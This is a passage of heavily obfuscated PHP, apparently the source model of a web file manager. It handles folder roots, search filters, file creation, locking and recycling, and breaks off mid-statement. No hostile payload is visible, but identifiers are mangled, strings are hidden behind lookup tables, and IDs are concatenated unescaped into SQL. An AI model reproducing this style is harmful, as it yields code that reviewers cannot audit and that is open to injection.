"\114\x45\106\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\x73\x6f\x75\162\x63\x65\137\155\145\164\x61\40\155\145\x74\141\x20\x6f\156\x20\x73\157\x75\x72\x63\145\x2e\x73\157\x75\x72\143\145\111\x44\40\x3d\40\155\x65\164\x61\x2e\x73\x6f\x75\162\143\145\111\104"; $¥›ßûñ = array(); $Ôß‰ò­ = str_replace(array($˜È÷ó²¥[262], $˜È÷ó²¥[53], $˜È÷ó²¥[2240]), $˜È÷ó²¥[12], $Ôß‰ò­); $Ôß‰ò­ = $˜È÷ó²¥[520] . str_replace($˜È÷ó²¥[50], $˜È÷ó²¥[521], $Ôß‰ò­); $Ù´Ë°ØÈ = $–ÇüÕ„‹[$˜È÷ó²¥[32]]; unset($–ÇüÕ„‹[$˜È÷ó²¥[32]]); foreach ($–ÇüÕ„‹ as $í‘Æ¾¥ => $øŞâÒ£ç) { $¥›ßûñ[$˜È÷ó²¥[520] . $í‘Æ¾¥] = $øŞâÒ£ç; } foreach ($Ù´Ë°ØÈ as $Ù…î•Áæ) { $¥›ßûñ[] = array($˜È÷ó²¥[525] => $Ù…î•Áæ, $˜È÷ó²¥[1079] => $˜È÷ó²¥[2071], array($˜È÷ó²¥[2241] => $Ù…î•Áæ, $˜È÷ó²¥[2242] => array($˜È÷ó²¥[7], array($˜È÷ó²¥[547], $˜È÷ó²¥[546])))); } $this->join($ÒÁ«×); $–ÇüÕ„‹ = $¥›ßûñ; } private function _parseSearchWhere($¸ñ•¢Èı) { $İô²¢‘à =& $_SERVER[ç¦¬”œš]; $¸¢Àƒ–— = array(); if (isset($¸ñ•¢Èı[$İô²¢‘à[840]]) && $¸ñ•¢Èı[$İô²¢‘à[840]]) { $¸¢Àƒ–—[$İô²¢‘à[88]] = array($İô²¢‘à[2243], $¸ñ•¢Èı[$İô²¢‘à[840]]); } if (isset($¸ñ•¢Èı[$İô²¢‘à[841]]) && $¸ñ•¢Èı[$İô²¢‘à[841]]) { $ÛŒóÒê = array($İô²¢‘à[2244], $¸ñ•¢Èı[$İô²¢‘à[841]]); if ($¸¢Àƒ–—[$İô²¢‘à[88]]) { $¸¢Àƒ–—[$İô²¢‘à[88]] = array($¸¢Àƒ–—[$İô²¢‘à[88]], $ÛŒóÒê, $İô²¢‘à[2245]); } else { $¸¢Àƒ–—[$İô²¢‘à[88]] = $ÛŒóÒê; } } if (isset($¸ñ•¢Èı[$İô²¢‘à[2237]]) && $¸ñ•¢Èı[$İô²¢‘à[2237]] > 0) { $¸¢Àƒ–—[$İô²¢‘à[79]] = array($İô²¢‘à[2243], $¸ñ•¢Èı[$İô²¢‘à[2237]]); } if (isset($¸ñ•¢Èı[$İô²¢‘à[2238]]) && $¸ñ•¢Èı[$İô²¢‘à[2238]]) { $ÛŒóÒê = array($İô²¢‘à[2244], $¸ñ•¢Èı[$İô²¢‘à[2238]]); if ($¸¢Àƒ–—[$İô²¢‘à[79]]) { $¸¢Àƒ–—[$İô²¢‘à[79]] = array($¸¢Àƒ–—[$İô²¢‘à[79]], $ÛŒóÒê, $İô²¢‘à[2245]); } else { $¸¢Àƒ–—[$İô²¢‘à[79]] = $ÛŒóÒê; } } if (isset($¸ñ•¢Èı[$İô²¢‘à[671]]) && $¸ñ•¢Èı[$İô²¢‘à[671]]) { $¸¢Àƒ–—[] = array($İô²¢‘à[538] => $¸ñ•¢Èı[$İô²¢‘à[671]], $İô²¢‘à[536] => $¸ñ•¢Èı[$İô²¢‘à[671]], $İô²¢‘à[1079] => $İô²¢‘à[2071]); } if (isset($¸ñ•¢Èı[$İô²¢‘à[495]]) && $¸ñ•¢Èı[$İô²¢‘à[495]]) { $¯ ÉêÔ = $¸ñ•¢Èı[$İô²¢‘à[495]]; if ($¯ ÉêÔ == $İô²¢‘à[78]) { $¸¢Àƒ–—[$İô²¢‘à[494]] = 1; } else { if ($¯ ÉêÔ == $İô²¢‘à[2246]) { $¸¢Àƒ–—[$İô²¢‘à[494]] = 0; } else { if ($¯ ÉêÔ) { $¯ ÉêÔ = is_array($¯ ÉêÔ) ? $¯ ÉêÔ : explode($İô²¢‘à[50], $¯ ÉêÔ); $¸¢Àƒ–—[$İô²¢‘à[495]] = array($İô²¢‘à[501], $¯ ÉêÔ); $¸¢Àƒ–—[$İô²¢‘à[494]] = 0; } } } } $this->_parseSearchParent($¸ñ•¢Èı, $¸¢Àƒ–—); if (isset($¸ñ•¢Èı[$İô²¢‘à[2067]]) && trim($¸ñ•¢Èı[$İô²¢‘à[2067]])) { $Ö×ÉŒÛÈ = trim($¸ñ•¢Èı[$İô²¢‘à[2067]]); $ê»ŸÆÂ· = explode($İô²¢‘à[53], $Ö×ÉŒÛÈ); if (strlen($Ö×ÉŒÛÈ) > 2 && (substr($Ö×ÉŒÛÈ, 0, 1) == $İô²¢‘à[121] && substr($Ö×ÉŒÛÈ, -1) == $İô²¢‘à[121]) || substr($Ö×ÉŒÛÈ, 0, 1) == $İô²¢‘à[58] && substr($Ö×ÉŒÛÈ, -1) == $İô²¢‘à[58]) { $Ö×ÉŒÛÈ = substr($Ö×ÉŒÛÈ, 1, -1); $ê»ŸÆÂ· = array($Ö×ÉŒÛÈ); } $¸¢Àƒ–—[$İô²¢‘à[32]] = array(array($İô²¢‘à[621], $İô²¢‘à[2069] . $Ö×ÉŒÛÈ . $İô²¢‘à[2069])); if (count($ê»ŸÆÂ·) > 1) { $¸¢Àƒ–—[$İô²¢‘à[32]] = array(); foreach ($ê»ŸÆÂ· as $²¾¥¾çˆ) { if (!trim($²¾¥¾çˆ)) { continue; } $¸¢Àƒ–—[$İô²¢‘à[32]][] = array($İô²¢‘à[621], $İô²¢‘à[2069] . trim($²¾¥¾çˆ) . $İô²¢‘à[2069]); } } } return $¸¢Àƒ–—; } private function _parseSearchParent($Æ¢©ÇÕÙ, &$¶­æò˜Í) { $›ÅÉİ˜ =& $_SERVER[ç¦¬”œš]; if (!isset($Æ¢©ÇÕÙ[$›ÅÉİ˜[192]]) || !$Æ¢©ÇÕÙ[$›ÅÉİ˜[192]]) { return; } $ê˜““Ùß = $this->pathInfo($Æ¢©ÇÕÙ[$›ÅÉİ˜[192]]); $î›ì¯© = $ê˜““Ùß[$›ÅÉİ˜[192]] . $›ÅÉİ˜[12] === $›ÅÉİ˜[228]; $½§Ğ £™ = $ê˜““Ùß[$›ÅÉİ˜[190]] == $›ÅÉİ˜[587]; if ($ê˜““Ùß[$›ÅÉİ˜[604]] == $›ÅÉİ˜[605]) { $’¾› óœ = $this->sourceInfo($Æ¢©ÇÕÙ[$›ÅÉİ˜[192]]); $ê˜““Ùß[$›ÅÉİ˜[593]] = $’¾› óœ[$›ÅÉİ˜[593]]; } $¶­æò˜Í[$›ÅÉİ˜[661]] = array($›ÅÉİ˜[621], $ê˜““Ùß[$›ÅÉİ˜[593]] . $Æ¢©ÇÕÙ[$›ÅÉİ˜[192]] . $›ÅÉİ˜[622]); $ë¦âº€ = isset($Æ¢©ÇÕÙ[$›ÅÉİ˜[1927]]) && in_array($›ÅÉİ˜[587], $Æ¢©ÇÕÙ[$›ÅÉİ˜[1927]]); if (!$ë¦âº€ || !$½§Ğ £™ || !$î›ì¯© || !$ê˜““Ùß[$›ÅÉİ˜[496]]) { return; } if (!AuthModel::authCheckRoot($ê˜““Ùß[$›ÅÉİ˜[496]][$›ÅÉİ˜[497]])) { return; } $°ûÚÏ†¢ = $ê˜““Ùß[$›ÅÉİ˜[578]] . $›ÅÉİ˜[12]; if ($°ûÚÏ†¢ == $›ÅÉİ˜[91]) { unset($¶­æò˜Í[$›ÅÉİ˜[661]]); $¶­æò˜Í[$›ÅÉİ˜[190]] = self::TYPE_GROUP; return; } $ÔêîÃ = Model($›ÅÉİ˜[594])->groupChildrenAll($°ûÚÏ†¢); $å—´Ñ„ë = count($ÔêîÃ); if ($å—´Ñ„ë <= 1) { return; } $Ÿ‘öŸ» = array($›ÅÉİ˜[192] => 0, $›ÅÉİ˜[190] => self::TYPE_GROUP, $›ÅÉİ˜[578] => array($›ÅÉİ˜[7], $ÔêîÃ)); $ı“º…Ê³ = $this->field($›ÅÉİ˜[2247])->where($Ÿ‘öŸ»)->limit($å—´Ñ„ë)->select(); $¶­æò˜Í[$›ÅÉİ˜[661]] = array(); foreach ($ı“º…Ê³ as $å‡¥ğÜõ) { $¶­æò˜Í[$›ÅÉİ˜[661]][] = array($›ÅÉİ˜[621], $›ÅÉİ˜[603] . $å‡¥ğÜõ[$›ÅÉİ˜[193]] . $›ÅÉİ˜[622]); } $¶­æò˜Í[$›ÅÉİ˜[661]][] = $›ÅÉİ˜[2071]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Äóó ¯ê) { $ÚÆÖä† =& $_SERVER[ç¦¬”œš]; $ü÷Ã©¡˜ = Model($ÚÆÖä†[586])->where(array($ÚÆÖä†[1761] => $Äóó ¯ê))->find(); $¨ƒ¤Üà° = $this->_mkdirRoot(SourceModel::TYPE_USER, $Äóó ¯ê, $ü÷Ã©¡˜[$ÚÆÖä†[32]]); $this->userDesktopAdd($¨ƒ¤Üà°); return $¨ƒ¤Üà°; } public function userDesktopAdd($’§é³¬ó) { $È•ÓşÂ =& $_SERVER[ç¦¬”œš]; $øƒÛàÂı = LNG($È•ÓşÂ[2248]); $’‡ó¾• = $this->mkdir($’§é³¬ó, $øƒÛàÂı); $this->metaSet($’‡ó¾•, $È•ÓşÂ[2249], $È•ÓşÂ[91]); $this->metaSet($’§é³¬ó, $È•ÓşÂ[2250], $’‡ó¾•); } public function userPathSafeAdd($ªş¡õñì) { $ïÏ”·ŒÖ =& $_SERVER[ç¦¬”œš]; $µ˜Î¢Ûê = Model($ïÏ”·ŒÖ[586])->getInfoFull($ªş¡õñì); if (!$µ˜Î¢Ûê) { return !1; } if (_get($µ˜Î¢Ûê, $ïÏ”·ŒÖ[608])) { return $µ˜Î¢Ûê[$ïÏ”·ŒÖ[548]][$ïÏ”·ŒÖ[2251]]; } $á˜‘£ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ªş¡õñì, $ïÏ”·ŒÖ[2252], $ïÏ”·ŒÖ[515]); Model($ïÏ”·ŒÖ[586])->metaSet($ªş¡õñì, $ïÏ”·ŒÖ[2251], $á˜‘£); $this->metaSet($á˜‘£, $ïÏ”·ŒÖ[2253], $ªş¡õñì); return $á˜‘£; } public function groupRootAdd($ŸÔ¿óÕ) { $ìÛÆ¸Êü =& $_SERVER[ç¦¬”œš]; $àŠ‚ô¸ = Model($ìÛÆ¸Êü[594])->where(array($ìÛÆ¸Êü[2061] => $ŸÔ¿óÕ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ŸÔ¿óÕ, $àŠ‚ô¸[$ìÛÆ¸Êü[32]]); } public function systemRootPathAdd($æ¡—¸ÙØ) { if ($æ¡—¸ÙØ != $_SERVER[ç¦¬”œš][614]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $æ¡—¸ÙØ); } public function userRootRemove($—ö•¨—í) { $šÇŒÏº = $this->targetSourceRoot(SourceModel::TYPE_USER, $—ö•¨—í, !0); foreach ($šÇŒÏº as $ş‡­û») { if (!$ş‡­û») { continue; } $this->remove($ş‡­û»[$_SERVER[ç¦¬”œš][193]], !1); } } public function groupRootRemove($½ú´ø¤Æ) { $Ï¦™éæ• = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $½ú´ø¤Æ); if (!$Ï¦™éæ•) { return; } $this->remove($Ï¦™éæ•[$_SERVER[ç¦¬”œš][193]], !1); } private function _mkdirRoot($¾Š“‡¤×, $Ùó«Äş, $‹£–äú”, $æ¥º´î± = '') { $Ïö•×šñ =& $_SERVER[ç¦¬”œš]; $ŠºÉáÈâ = defined($Ïö•×šñ[2195]) ? USER_ID : 0; $ë×í÷¡ = array($Ïö•×šñ[486] => 0, $Ïö•×šñ[657] => $¾Š“‡¤×, $Ïö•×šñ[658] => $Ùó«Äş, $Ïö•×šñ[655] => 1, $Ïö•×šñ[659] => $ŠºÉáÈâ, $Ïö•×šñ[660] => $ŠºÉáÈâ, $Ïö•×šñ[656] => $æ¥º´î±, $Ïö•×šñ[661] => $Ïö•×šñ[603], $Ïö•×šñ[513] => 0, $Ïö•×šñ[626] => 0, $Ïö•×šñ[551] => 0, $Ïö•×šñ[662] => $Ïö•×šñ[12]); if ($ÀÆêçŞø = $this->where($ë×í÷¡)->find()) { return $ÀÆêçŞø[$Ïö•×šñ[193]]; } $íÈ—ûÁ = "\115\x6f\144\145\x6c\x53\157\165\x72\x63\145\x2e\x6d\x6b\x64\151\162\122\157\157\164\56{$¾Š“‡¤×}\x2e{$Ùó«Äş}\x2e" . $‹£–äú”; CacheLock::lock($íÈ—ûÁ); $ë×í÷¡[$Ïö•×šñ[32]] = $‹£–äú”; $İË¨‰­ = $this->add($ë×í÷¡); $”³èçª = array($Ïö•×šñ[663] => short_id($İË¨‰­)); $this->where(array($Ïö•×šñ[500] => $İË¨‰­))->save($”³èçª); CacheLock::unlock($íÈ—ûÁ); return $İË¨‰­; } private function targetSourceRoot($ÌàÊúùŒ, $ÆöÀšÓÂ, $ğ„ò¸È = false) { $Ü·ÏëÈÍ =& $_SERVER[ç¦¬”œš]; $â¤Ò¤æÛ = array($Ü·ÏëÈÍ[486] => 0, $Ü·ÏëÈÍ[657] => $ÌàÊúùŒ, $Ü·ÏëÈÍ[658] => $ÆöÀšÓÂ); if ($ğ„ò¸È) { $õš“ìê´ = $this->where($â¤Ò¤æÛ)->select(); return $õš“ìê´ ? $õš“ìê´ : array(); } $›²ë¯¢… = $this->where($â¤Ò¤æÛ)->find(); return $›²ë¯¢… ? $›²ë¯¢… : array(); } public function sourceRootGroup($î¶ˆôöŠ) { $Û”Ğ¶†Â =& $_SERVER[ç¦¬”œš]; if (is_string($î¶ˆôöŠ)) { $î¶ˆôöŠ = array($î¶ˆôöŠ); } $á’èÒ’Í = $this->listSourceRoot(SourceModel::TYPE_GROUP, $î¶ˆôöŠ, $Û”Ğ¶†Â[220]); $¡“«¼°’ = array($Û”Ğ¶†Â[445] => $á’èÒ’Í, $Û”Ğ¶†Â[442] => array($Û”Ğ¶†Â[838] => count($î¶ˆôöŠ))); $this->_listDataApply($¡“«¼°’[$Û”Ğ¶†Â[445]]); $this->_listMake($¡“«¼°’); return array_to_keyvalue($¡“«¼°’[$Û”Ğ¶†Â[85]], $Û”Ğ¶†Â[578]); } public function mkfile($ÏªŠÂºÜ, $…¼›ü¼ş, $İà×ÛÇ” = '', $¥ËÎ‹ú = REPEAT_RENAME) { $€àíŒ­Ÿ =& $_SERVER[ç¦¬”œš]; $ÎÃğ½» = Model($€àíŒ­Ÿ[683])->addFileByContent($İà×ÛÇ”, $…¼›ü¼ş); return $this->_createFileCall($ÏªŠÂºÜ, $…¼›ü¼ş, $ÎÃğ½», $¥ËÎ‹ú, $€àíŒ­Ÿ[1429]); } public function addFile($ˆæî¾×, $ÍóÄø ¾, $Ÿº¢©Ó·, $í¯óØ¼ñ = false, $™ƒğÕĞÓ = REPEAT_RENAME) { $¯Ü½€÷ß = Model($_SERVER[ç¦¬”œš][683])->addFile($ÍóÄø ¾, $Ÿº¢©Ó·, $í¯óØ¼ñ); return $this->_createFileCall($ˆæî¾×, $Ÿº¢©Ó·, $¯Ü½€÷ß, $™ƒğÕĞÓ); } public function addFileByFileID($ÌÇœˆæÕ, $à¸Š„¤×, $«ä­ÆÄÜ, $á¹«¤­ê = REPEAT_RENAME) { $ğ¾¼ÑÈ¸ =& $_SERVER[ç¦¬”œš]; $ÎõŞ×èŠ = Model($ğ¾¼ÑÈ¸[683])->find($à¸Š„¤×); Model($ğ¾¼ÑÈ¸[683])->linkAdd($à¸Š„¤×); return $this->_createFileCall($ÌÇœˆæÕ, $«ä­ÆÄÜ, $ÎõŞ×èŠ, $á¹«¤­ê); } public function addFileByRemote($¸¢Ğ’ÏË, $ñÚĞ‡á¸, $ù¼ù¤ˆ, $Ò˜²²éş = array(), $³ÖÍ¨— = REPEAT_RENAME) { $ıÔ½ïé = Model($_SERVER[ç¦¬”œš][683])->addFileByRemote($ñÚĞ‡á¸, $ù¼ù¤ˆ, $Ò˜²²éş); return $this->_createFileCall($¸¢Ğ’ÏË, $ù¼ù¤ˆ, $ıÔ½ïé, $³ÖÍ¨—); } private function _createFileCall($ÕÕ áË×, $Á‘‹¯æÌ, $ßÔ“æ‘, $˜™ıä»õ, $±˜áÈĞ = "\165\x70\x6c\157\141\x64") { $ßäåšÇ =& $_SERVER[ç¦¬”œš]; $ıª¾ÇÄ = !1; $this->setMasterDB(); $this->lockWriteStart($ÕÕ áË×, $Á‘‹¯æÌ); $ËÛŠ´­° = $this->fileNameExist($ÕÕ áË×, $Á‘‹¯æÌ); $›º¦­·º = $this->_createFile($ÕÕ áË×, $Á‘‹¯æÌ, $ßÔ“æ‘, $˜™ıä»õ, $ıª¾ÇÄ); if (!$ıª¾ÇÄ) { Model($ßäåšÇ[553])->remove($ßÔ“æ‘[$ßäåšÇ[550]]); } if ($ıª¾ÇÄ && $›º¦­·º && $›º¦­·º != $ËÛŠ´­°) { Model($ßäåšÇ[2221])->eventCreate($›º¦­·º, $±˜áÈĞ); } $this->lockWriteEnd($ÕÕ áË×, $Á‘‹¯æÌ); return $›º¦­·º; } public function mkdir($ƒÃ¼œë, $è°ó´“Ì, $—ÎÍ›Æ” = REPEAT_SKIP) { $—ù´ŞÃ‡ =& $_SERVER[ç¦¬”œš]; $this->setMasterDB(); $û¾æÍß = $this->sourceInfo($ƒÃ¼œë); if (!$û¾æÍß) { return !1; } $this->lockWriteStart($ƒÃ¼œë, $è°ó´“Ì); if ($—ÎÍ›Æ” !== !1) { $úâÑœ = $this->fileNameExist($ƒÃ¼œë, $è°ó´“Ì); if ($úâÑœ && $—ÎÍ›Æ” != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ƒÃ¼œë, $è°ó´“Ì); return $úâÑœ; } $è°ó´“Ì = $this->fileNameAuto($ƒÃ¼œë, $è°ó´“Ì, $—ÎÍ›Æ”); } $ıáÊ²™Û = array($—ù´ŞÃ‡[655] => 1, $—ù´ŞÃ‡[503] => $è°ó´“Ì, $—ù´ŞÃ‡[656] => $—ù´ŞÃ‡[12], $—ù´ŞÃ‡[551] => 0, $—ù´ŞÃ‡[626] => 0); $¹Áºœı¸ = $this->_addSource($ıáÊ²™Û, $û¾æÍß); Model($—ù´ŞÃ‡[2221])->eventCreate($¹Áºœı¸, $—ù´ŞÃ‡[1430]); $this->lockWriteEnd($ƒÃ¼œë, $è°ó´“Ì); return $¹Áºœı¸; } public function listSourceRoot($€¼üÒ®Õ, $ßä¦Íªà, $«úûÇì¹ = "\163\157\x75\x72\x63\x65\111\104\54\164\141\x72\x67\145\x74\111\104\54\x73\x69\172\x65") { $ùÇ²¹Æ¸ =& $_SERVER[ç¦¬”œš]; $ˆĞÔ¿·¬ = $ùÇ²¹Æ¸[454]; $Ñ³ºò× = array(); $­Ö÷¾óà = 1024 * 50; $Éá¦Æœâ = is_array($Éá¦Æœâ) ? $Éá¦Æœâ : array(); $ğ´àÎ†ø = count($ßä¦Íªà); $‹Æàê = $this->tablePrefix . $ùÇ²¹Æ¸[2254]; for ($ö˜‚„¢Ì = 0; $ö˜‚„¢Ì < $ğ´àÎ†ø; $ö˜‚„¢Ì++) { $ÛæëãíŠ = $ßä¦Íªà[$ö˜‚„¢Ì]; $ˆĞÔ¿·¬ .= "\x53\105\114\105\103\x54\x20\x2a\x20\x46\122\x4f\x4d\x20\x28\x53\x45\x4c\105\103\x54\40{$«úûÇì¹}\x20\x46\x52\117\x4d\x20\x60{$‹Æàê}\x60\x20\x57\x48\105\122\x45\40"; $ˆĞÔ¿·¬ .= "\140\160\141\x72\x65\x6e\164\x49\x44\x60\75\60\40\x41\x4e\x44\40\140\164\141\x72\x67\x65\x74\x49\x44\x60\x3d{$ÛæëãíŠ}\x20\101\x4e\x44\x20\140\164\141\162\147\x65\x74\x54\x79\x70\x65\140\75{$€¼üÒ®Õ}\40\141\156\144\40\146\151\154\145\x54\171\x70\145\x3d\x27\x27\x20\x6c\151\155\x69\164\40\x31\x29\40\141\163\x20\x74\x62\x5f{$ö˜‚„¢Ì}\x20\125\116\x49\x4f\x4e\40\101\114\114\40"; if ((strlen($ˆĞÔ¿·¬) >= $­Ö÷¾óà || $ö˜‚„¢Ì == $ğ´àÎ†ø - 1) && $ˆĞÔ¿·¬) { $ˆĞÔ¿·¬ = substr($ˆĞÔ¿·¬, 0, -strlen($ùÇ²¹Æ¸[1117])); $”™âŒÚ² = $this->query($ˆĞÔ¿·¬); $ˆĞÔ¿·¬ = $ùÇ²¹Æ¸[12]; $Ñ³ºò× = array_merge($Ñ³ºò×, $”™âŒÚ²); } } return $Ñ³ºò×; } private function _createFile($‚³¯ßäõ, $ÖÁ›ªıÕ, $ªÅƒ‘Çì, $±…ÙÍƒÇ, &$Î‚Ÿı­Á) { $ëëƒ·‡¿ =& $_SERVER[ç¦¬”œš]; $Ñ®•Î§¿ = $this->sourceInfo($‚³¯ßäõ); if (!$ªÅƒ‘Çì || !$Ñ®•Î§¿) { return !1; } if ($±…ÙÍƒÇ !== !1) { $ÂÀÔ†’ï = $this->fileNameExist($‚³¯ßäõ, $ÖÁ›ªıÕ); } $Î‚Ÿı­Á = !0; if ($±…ÙÍƒÇ && $ÂÀÔ†’ï) { if ($±…ÙÍƒÇ == REPEAT_SKIP) { $Î‚Ÿı­Á = !1; return $ÂÀÔ†’ï; } else { if ($±…ÙÍƒÇ == REPEAT_REPLACE) { $¼›åøÜ¨ = $this->sourceInfo($ÂÀÔ†’ï); $“ÜÊ…‰Ÿ = $this->fileHistory($¼›åøÜ¨, $ªÅƒ‘Çì[$ëëƒ·‡¿[550]], $ªÅƒ‘Çì[$ëëƒ·‡¿[79]]); if (!$“ÜÊ…‰Ÿ) { $Î‚Ÿı­Á = !1; } else { $this->folderSizeReset($‚³¯ßäõ); } return $ÂÀÔ†’ï; } else { $ÖÁ›ªıÕ = $this->fileNameAuto($‚³¯ßäõ, $ÖÁ›ªıÕ, $±…ÙÍƒÇ, !1); } } } $ê‡òñ© = array($ëëƒ·‡¿[655] => 0, $ëëƒ·‡¿[503] => $ÖÁ›ªıÕ, $ëëƒ·‡¿[656] => substr(get_path_ext($ÖÁ›ªıÕ), 0, 10), $ëëƒ·‡¿[551] => $ªÅƒ‘Çì[$ëëƒ·‡¿[550]], $ëëƒ·‡¿[626] => $ªÅƒ‘Çì[$ëëƒ·‡¿[79]]); $˜àé²Ëë = $this->_addSource($ê‡òñ©, $Ñ®•Î§¿); $this->folderSizeReset($‚³¯ßäõ, intval($ê‡òñ©[$ëëƒ·‡¿[79]])); return $˜àé²Ëë; } protected function fileHistory($¢öÌßù, $Ş©œ¹á³, $ÆŒ¶¾Ú) { $Â”Æ·Ú¨ =& $_SERVER[ç¦¬”œš]; if ($¢öÌßù[$Â”Æ·Ú¨[550]] == $Ş©œ¹á³) { return !1; } $this->checkLock($¢öÌßù[$Â”Æ·Ú¨[193]], $Ş©œ¹á³); Model($Â”Æ·Ú¨[2255])->addHistory($¢öÌßù); $¶–å«î = array($Â”Æ·Ú¨[660] => USER_ID, $Â”Æ·Ú¨[507] => time(), $Â”Æ·Ú¨[550] => $Ş©œ¹á³, $Â”Æ·Ú¨[79] => $ÆŒ¶¾Ú); $this->where(array($Â”Æ·Ú¨[500] => $¢öÌßù[$Â”Æ·Ú¨[193]]))->save($¶–å«î); $this->sourceCacheClear($¢öÌßù[$Â”Æ·Ú¨[193]]); return !0; } public function checkLock($íÒš‚á, $¶ê§óŒ) { $Ç¶äÆ²¸ =& $_SERVER[ç¦¬”œš]; $ÄÌ”¢ô¶ = $this->pathInfo($íÒš‚á); if (!$this->fileIsLock($ÄÌ”¢ô¶, !0)) { return; } $öÚ¿ÔÏˆ = Session::get($Ç¶äÆ²¸[2256]); $‚ÉÏ·´ = substr($ÄÌ”¢ô¶[$Ç¶äÆ²¸[32]], 0, -1 - strlen($ÄÌ”¢ô¶[$Ç¶äÆ²¸[169]])) . $Ç¶äÆ²¸[1294] . $öÚ¿ÔÏˆ . $Ç¶äÆ²¸[10] . $ÄÌ”¢ô¶[$Ç¶äÆ²¸[169]]; $«Ñ‰÷ş• = Model($Ç¶äÆ²¸[683])->find($¶ê§óŒ); $this->_createFileCall($ÄÌ”¢ô¶[$Ç¶äÆ²¸[192]], $‚ÉÏ·´, $«Ñ‰÷ş•, REPEAT_REPLACE, $Ç¶äÆ²¸[1429]); $ÈÃ»Àµí = $ÄÌ”¢ô¶[$Ç¶äÆ²¸[548]][$Ç¶äÆ²¸[619]]; $´èÁú¤ = $ÈÃ»Àµí[$Ç¶äÆ²¸[2257]] ? $ÈÃ»Àµí[$Ç¶äÆ²¸[2257]] : $ÈÃ»Àµí[$Ç¶äÆ²¸[32]]; show_json(LNG($Ç¶äÆ²¸[2258]) . $Ç¶äÆ²¸[2259] . LNG($Ç¶äÆ²¸[2260]) . $Ç¶äÆ²¸[2261] . $´èÁú¤ . $Ç¶äÆ²¸[2262], !1); } public function fileIsLock($Ó€§à, $„²³ı¬­ = false) { $û¯¢Ê¡ =& $_SERVER[ç¦¬”œš]; if (!_get($Ó€§à, $û¯¢Ê¡[615], 0)) { return !1; } if ($Ó€§à[$û¯¢Ê¡[548]][$û¯¢Ê¡[618]] != USER_ID) { return !0; } $òûë—ß = $GLOBALS[$û¯¢Ê¡[6]][$û¯¢Ê¡[92]][$û¯¢Ê¡[616]]; if ($Ó€§à[$û¯¢Ê¡[548]][$û¯¢Ê¡[617]] <= time() - $òûë—ß) { $this->metaSet($Ó€§à[$û¯¢Ê¡[193]], $û¯¢Ê¡[618], null); $this->metaSet($Ó€§à[$û¯¢Ê¡[193]], $û¯¢Ê¡[617], null); } if ($„²³ı¬­) { $this->metaSet($Ó€§à[$û¯¢Ê¡[193]], $û¯¢Ê¡[617], time()); } return !1; } private function _addSource($¬úæ¥Ô’, $“–²§æû) { $‘®İğüá =& $_SERVER[ç¦¬”œš]; $û«¸¸ Ë = defined($‘®İğüá[2195]) ? USER_ID : 0; $œé²ßãÏ = array($‘®İğüá[657] => $“–²§æû[$‘®İğüá[190]], $‘®İğüá[658] => $“–²§æû[$‘®İğüá[578]], $‘®İğüá[659] => $û«¸¸ Ë, $‘®İğüá[660] => $û«¸¸ Ë, $‘®İğüá[486] => $“–²§æû[$‘®İğüá[193]], $‘®İğüá[661] => $“–²§æû[$‘®İğüá[593]] . $“–²§æû[$‘®İğüá[193]] . $‘®İğüá[50], $‘®İğüá[513] => 0, $‘®İğüá[662] => $‘®İğüá[12]); $¬úæ¥Ô’ = array_merge($œé²ßãÏ, $¬úæ¥Ô’); $this->updateModifyTime($¬úæ¥Ô’[$‘®İğüá[192]]); $áÁÀÛÁ = $‘®İğüá[2263] . $“–²§æû[$‘®İğüá[193]]; if (isset(self::$cacheChildList[$áÁÀÛÁ])) { unset(self::$cacheChildList[$áÁÀÛÁ]); } static $š©­¬ï = false; if (!$š©­¬ï) { Hook::trigger($‘®İğüá[645], $¬úæ¥Ô’); $š©­¬ï = !0; } $òïİ·£ş = $this->add($¬úæ¥Ô’); $¾«¨˜¾ì = array($‘®İğüá[663] => short_id($òïİ·£ş)); $this->where(array($‘®İğüá[500] => $òïİ·£ş))->save($¾«¨˜¾ì); $this->setNamePinyin($òïİ·£ş, $¬úæ¥Ô’[$‘®İğüá[32]]); return $òïİ·£ş; } public function remove($¦çÖßâË, $‡—Şƒ§˜ = true) { $˜·‚úÔ¨ =& $_SERVER[ç¦¬”œš]; $»”ü°³÷ = $this->sourceInfo($¦çÖßâË); $“¥ÄÎõª = intval($»”ü°³÷[$˜·‚úÔ¨[190]]) === self::TYPE_SYSTEM; $ŸòÉŠŒ„ = Model($˜·‚úÔ¨[517])->get($˜·‚úÔ¨[2264]) == $˜·‚úÔ¨[91]; if ($“¥ÄÎõª || $‡—Şƒ§˜ || !$ŸòÉŠŒ„) { return $this->removeNow($¦çÖßâË, $‡—Şƒ§˜); } $ğÆ¢½ÕÖ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $…ùˆ»Ÿ = $»”ü°³÷[$˜·‚úÔ¨[190]] == self::TYPE_USER ? $˜·‚úÔ¨[671] : $˜·‚úÔ¨[587]; if ($…ùˆ»Ÿ == $˜·‚úÔ¨[671]) { $â¬ÎúÑ = Model($˜·‚úÔ¨[586])->getInfo($»”ü°³÷[$˜·‚úÔ¨[578]]); $Ú«Î·Ç˜ = !empty($â¬ÎúÑ[$˜·‚úÔ¨[2257]]) ? $â¬ÎúÑ[$˜·‚úÔ¨[2257]] : $â¬ÎúÑ[$˜·‚úÔ¨[32]]; $Ú«Î·Ç˜ = $˜·‚úÔ¨[337] . $Ú«Î·Ç˜ . $˜·‚úÔ¨[2265] . $»”ü°³÷[$˜·‚úÔ¨[578]]; } else { $â¬ÎúÑ = Model($˜·‚úÔ¨[594])->getInfo($»”ü°³÷[$˜·‚úÔ¨[578]]); $Ú«Î·Ç˜ = _get($â¬ÎúÑ, $˜·‚úÔ¨[32]); $Ú«Î·Ç˜ = $˜·‚úÔ¨[176] . $Ú«Î·Ç˜ . $˜·‚úÔ¨[2266] . $»”ü°³÷[$˜·‚úÔ¨[578]]; } $×†’Ø¯À = $˜·‚úÔ¨[2267] . md5($Ú«Î·Ç˜); CacheLock::lock($×†’Ø¯À); $’õ¶¥¥Ë = $this->fileNameExist($ğÆ¢½ÕÖ, $Ú«Î·Ç˜); if (!$’õ¶¥¥Ë) { $’õ¶¥¥Ë = $this->mkdir($ğÆ¢½ÕÖ, 